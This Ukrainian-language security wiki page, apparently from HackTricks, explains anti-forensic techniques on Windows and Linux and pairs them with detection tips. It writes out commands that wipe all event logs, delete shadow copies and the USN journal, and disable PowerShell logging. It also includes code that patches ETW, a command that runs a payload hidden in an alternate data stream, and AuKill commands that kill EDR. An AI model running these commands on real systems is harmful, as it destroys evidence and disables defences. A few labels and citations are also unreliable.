# Антифорензичні техніки

## Часові мітки

Зловмисник може бути зацікавлений у **зміні часових міток файлів**, щоб уникнути виявлення.\
Часові мітки можна знайти всередині MFT в атрибутах `$STANDARD_INFORMATION` \_\_ і \_\_ `$FILE_NAME`.

Обидва атрибути містять 4 часові мітки: **модифікація**, **доступ**, **створення** та **модифікація запису MFT** (MACE або MACB).

**Windows explorer** та інші інструменти відображають інформацію з **`$STANDARD_INFORMATION`**.

### TimeStomp - Антифорензичний інструмент

Цей інструмент **змінює** інформацію про часові мітки всередині **`$STANDARD_INFORMATION`**, **але не** інформацію всередині **`$FILE_NAME`**. Тому можна **виявити** **підозрілу** **активність**.

### Usnjrnl

**USN Journal** (журнал Update Sequence Number) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тома. Інструмент [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) дає змогу досліджувати ці зміни.

![TimeStomp - Антифорензичний інструмент - Usnjrnl: USN Journal (журнал Update Sequence Number) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тома. Т...](<../../images/image (801).png>)

На попередньому зображенні показано **результат**, виведений **інструментом**, де можна побачити, що до файлу було внесено **певні зміни**.

### $LogFile

**Усі зміни метаданих файлової системи записуються** в процесі, відомому як [журналювання з випереджальним записом](https://en.wikipedia.org/wiki/Write-ahead_logging). Записані метадані зберігаються у файлі `**$LogFile**`, розташованому в кореневому каталозі файлової системи NTFS. Для аналізу цього файлу та виявлення змін можна використовувати такі інструменти, як [LogFileParser](https://github.com/jschicht/LogFileParser).

![Usnjrnl - $LogFile: Усі зміни метаданих файлової системи записуються в процесі, відомому як журналювання з випереджальним записом. Записані метадані зберігаються у файлі $LogFile , розташованому в кореневому...](<../../images/image (137).png>)

Знову ж таки, у результаті роботи інструменту можна побачити, що **було внесено певні зміни**.

За допомогою того самого інструменту можна визначити, **на який час були змінені часові мітки**:

![Usnjrnl - $LogFile: За допомогою того самого інструменту можна визначити, на який час були змінені часові мітки](<../../images/image (1089).png>)

- CTIME: Час створення файлу
- ATIME: Час модифікації файлу
- MTIME: Час модифікації запису MFT файлу
- RTIME: Час доступу до файлу

### Порівняння `$STANDARD_INFORMATION` і `$FILE_NAME`

Ще одним способом виявлення підозрілих змінених файлів є порівняння часу в обох атрибутах для пошуку **невідповідностей**.

### Наносекунди

Часові мітки **NTFS** мають **точність** **100 наносекунд**. Тому пошук файлів із часовими мітками на кшталт 2010-10-10 10:10:**00.000:0000 є дуже підозрілим**.

### SetMace - Антифорензичний інструмент

Цей інструмент може змінювати обидва атрибути `$STARNDAR_INFORMATION` і `$FILE_NAME`. Однак починаючи з Windows Vista для зміни цієї інформації необхідна запущена ОС.

## Приховування даних

NFTS використовує кластери та мінімальний розмір інформації. Це означає, що якщо файл займає один із половиною кластера, **половина, що залишилася, ніколи не буде використана** до видалення файлу. Отже, у цьому **вільному просторі можна приховувати дані**.

Існують такі інструменти, як slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз `$logfile` і `$usnjrnl` може показати, що було додано певні дані:

![SetMace - Антифорензичний інструмент - Приховування даних: Існують такі інструменти, як slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз $logfile і $usnjrnl може показати, що...](<../../images/image (1060).png>)

Після цього можна отримати вільний простір за допомогою таких інструментів, як FTK Imager. Зверніть увагу, що цей тип інструментів може зберігати вміст в обфускованому або навіть зашифрованому вигляді.

## UsbKill

Це інструмент, який **вимикає комп’ютер, якщо виявлено будь-яку зміну** USB-портів.\
Виявити його можна, перевіривши запущені процеси та **переглянувши кожен запущений python-скрипт**.

## Live Linux Distributions

Ці дистрибутиви **виконуються всередині** пам’яті **RAM**. Єдиний спосіб їх виявити — **якщо файлову систему NTFS змонтовано з правами на запис**. Якщо її змонтовано лише з правами на читання, виявити вторгнення буде неможливо.

## Безпечне видалення

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Конфігурація Windows

Можна вимкнути кілька методів журналювання Windows, щоб значно ускладнити forensic-розслідування.

### Вимкнення часових міток - UserAssist

Це ключ реєстру, який зберігає дати й час запуску кожного виконуваного файлу користувачем.

Вимкнення UserAssist потребує двох кроків:

1. Встановіть два ключі реєстру — `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` і `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` — у значення zero, щоб повідомити, що UserAssist потрібно вимкнути.
2. Очистіть піддерева реєстру, подібні до `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Вимкнення часових міток - Prefetch

Це зберігає інформацію про запущені застосунки з метою підвищення продуктивності системи Windows. Однак ця інформація також може бути корисною для forensic-практик.

- Запустіть `regedit`
- Виберіть шлях до файлу `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Клацніть правою кнопкою миші `EnablePrefetcher` і `EnableSuperfetch`
- Виберіть Modify для кожного з них, щоб змінити значення з 1 (або 3) на 0
- Перезапустіть систему

### Вимкнення часових міток - час останнього доступу

Щоразу, коли папку відкривають із тому NTFS на сервері Windows NT, система оновлює поле часової мітки для кожної папки у списку, яке називається часом останнього доступу. На інтенсивно використовуваному томі NTFS це може впливати на продуктивність.

1. Відкрийте редактор реєстру (Regedit.exe).
2. Перейдіть до `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Знайдіть `NtfsDisableLastAccessUpdate`. Якщо його не існує, додайте цей DWORD і встановіть його значення 1, що вимкне цей процес.
4. Закрийте редактор реєстру та перезавантажте сервер.

### Видалення історії USB

Усі **записи USB-пристроїв** зберігаються в реєстрі Windows у ключі реєстру **USBSTOR**, який містить підключі, що створюються щоразу, коли ви під’єднуєте USB-пристрій до ПК або ноутбука. Цей ключ можна знайти тут: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Видаливши його**, ви видалите історію USB.\
Також можна використовувати інструмент [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), щоб переконатися, що їх видалено (і видалити їх).

Іншим файлом, у якому зберігається інформація про USB-пристрої, є `setupapi.dev.log` у `C:\Windows\INF`. Його також слід видалити.

### Вимкнення Shadow Copies

**Перелічити** Shadow Copies можна за допомогою `vssadmin list shadowstorage`\
**Видалити** їх можна за допомогою `vssadmin delete shadow`

Також їх можна видалити через GUI, виконавши кроки, запропоновані тут: [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Щоб вимкнути Shadow Copies, виконайте [ці кроки](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Відкрийте програму Services, ввівши «services» у текстове поле пошуку після натискання кнопки «Пуск» у Windows.
2. У списку знайдіть «Volume Shadow Copy», виберіть його та відкрийте Properties, клацнувши правою кнопкою миші.
3. У спадному меню «Startup type» виберіть Disabled, а потім підтвердьте зміну, натиснувши Apply і OK.

Також можна змінити в реєстрі конфігурацію файлів, які копіюватимуться в Shadow Copy, за шляхом `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Перезапис видалених файлів

- Можна використовувати **інструмент Windows**: `cipher /w:C`. Це вказує cipher видалити всі дані з доступного невикористаного дискового простору на диску C.
- Також можна використовувати такі інструменти, як [**Eraser**](https://eraser.heidi.ie)

### Видалення журналів подій Windows

- Windows + R --> eventvwr.msc --> Розгорніть «Windows Logs» --> Клацніть правою кнопкою миші кожну категорію та виберіть «Clear Log»
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Вимкнення журналів подій Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- У розділі служб вимкніть службу «Windows Event Log»
- `WEvtUtil.exec clear-log` або `WEvtUtil.exe cl`

### Вимкнення $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Розширене журналювання та підміна слідів (2023-2025)

### Журналювання PowerShell ScriptBlock/Module

Останні версії Windows 10/11 і Windows Server зберігають **детальні forensic-артефакти PowerShell** у
`Microsoft-Windows-PowerShell/Operational` (події 4104/4105/4106).
Зловмисники можуть вимкнути або стерти їх на льоту:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Захисники повинні відстежувати зміни до цих ключів реєстру та масове видалення подій PowerShell.

### ETW (Event Tracing for Windows) Patch

Продукти безпеки кінцевих точок значною мірою покладаються на ETW. Популярний у 2024 році метод ухилення полягає у патчінгу `ntdll!EtwEventWrite`/`EtwEventWriteFull` у пам’яті, щоб кожен виклик ETW повертав `STATUS_SUCCESS`, не створюючи подію:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (наприклад, `EtwTiSwallow`) реалізують той самий primitive у PowerShell або C++.
Оскільки patch є **локальним для процесу**, EDR, що працюють всередині інших процесів, можуть його пропустити.<sup>[[5]](#references)</sup>
Виявлення: порівнюйте `ntdll` у пам’яті з його версією на диску або встановлюйте hook до переходу в user-mode.

### Відродження Alternate Data Streams (ADS)

У 2023 році було помічено, як у межах malware campaigns (наприклад, loaders **FIN12**) розміщували binaries другого етапу
всередині ADS, щоб залишатися непомітними для традиційних scanners:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Перелічуйте streams за допомогою `dir /R`, `Get-Item -Stream *` або `streams64.exe` від Sysinternals.
Копіювання host file до FAT/exFAT або через SMB видалить hidden stream, що можна використати
для відновлення payload інвестигаторами.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver тепер регулярно використовується для **anti-forensics** під час
ransomware-інцидентів.
Open-source tool **AuKill** завантажує підписаний, але вразливий driver (`procexp152.sys`), щоб
призупинити або завершити роботу EDR і forensic sensors **перед шифруванням і знищенням логів**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Драйвер після цього видаляється, залишаючи мінімальну кількість артефактів.<sup>[[1]](#references)</sup>
Заходи захисту: увімкніть Microsoft vulnerable-driver blocklist (HVCI/SAC)
і налаштуйте сповіщення про створення kernel-service із шляхів, доступних для запису користувачам.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self‑patching скомпрометованих сервісів для зменшення виявлення (Linux)
Зловмисники дедалі частіше виконують “self‑patch” сервісу одразу після його експлуатації, щоб запобігти повторній експлуатації та придушити виявлення на основі вразливостей. Ідея полягає в заміні вразливих компонентів найновішими легітимними upstream-бінарними файлами/JAR-файлами, щоб сканери повідомляли, що хост виправлено, тоді як persistence і C2 зберігаються.<sup>[[3]](#references)</sup>

Приклад: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Після exploitation зловмисники завантажили легітимні JAR-файли з Maven Central (repo1.maven.org), видалили вразливі JAR-файли з інсталяції ActiveMQ та перезапустили broker.
- Це усунуло початковий RCE, водночас зберігши інші foothold-и (cron, зміни SSH-конфігурації, окремі C2 implants).

Операційний приклад (ілюстративний)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Поради з Forensic/hunting
- Перевірте каталоги сервісів на наявність незапланованих замін бінарних файлів/JAR:
- Debian/Ubuntu: `dpkg -V activemq` і порівняйте хеші/шляхи файлів із дзеркалами репозиторіїв.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Шукайте версії JAR, присутні на диску, але не зареєстровані package manager, або символічні посилання, оновлені поза штатним процесом.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` для зіставлення ctime/mtime з часовим вікном компрометації.
- Shell history/process telemetry: ознаки використання `curl`/`wget` для доступу до `repo1.maven.org` або інших artifact CDN одразу після початкової експлуатації.
- Change management: перевірте, хто і чому застосував “patch”, а не лише наявність patched version.

### Cloud-service C2 із bearer tokens і anti-analysis stagers
Зафіксовані дії зловмисників поєднували кілька long-haul C2 paths і anti-analysis packaging:<sup>[[3]](#references)</sup>
- Захищені паролем PyInstaller ELF loaders для ускладнення sandboxing і static analysis (наприклад, encrypted PYZ, тимчасове розпакування в `/_MEI*`).
- Indicators: результати `strings`, такі як `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: розпакування до `/tmp/_MEI*` або custom `--runtime-tmpdir` paths.
- Dropbox-backed C2 із hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` з `Authorization: Bearer <token>`.
- Виконуйте hunt у proxy/NetFlow/Zeek/Suricata для outbound HTTPS до Dropbox domains із server workloads, які зазвичай не синхронізують файли.
- Parallel/backup C2 через tunneling (наприклад, Cloudflare Tunnel `cloudflared`), щоб зберегти контроль у разі блокування одного з каналів.
- Host IOCs: процеси/units `cloudflared`, config у `~/.cloudflared/*.json`, outbound 443 до Cloudflare edges.

### Persistence і “hardening rollback” для збереження доступу (приклади для Linux)
Зловмисники часто поєднують self-patching із durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: зміни stub `0anacron` у кожному каталозі `/etc/cron.*/` для періодичного виконання.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: увімкнення root logins і зміна default shells для low-privileged accounts.
- Hunt для root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt для підозрілих interactive shells у system accounts (наприклад, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Випадкові beacon artifacts із короткими назвами (8 алфавітних символів), скинуті на диск і такі, що також контактують із cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Захисники повинні зіставляти ці артефакти із зовнішньою доступністю та подіями patching сервісів, щоб виявити anti-forensic self-remediation, використане для приховування початкової експлуатації.

## References

- [1] [Sophos X-Ops – AuKill: Weaponized Vulnerable Driver для вимкнення EDR (березень 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite для stealth: Detection & Hunting (червень 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching для persistence: як Linux malware DripDropper переміщується через cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
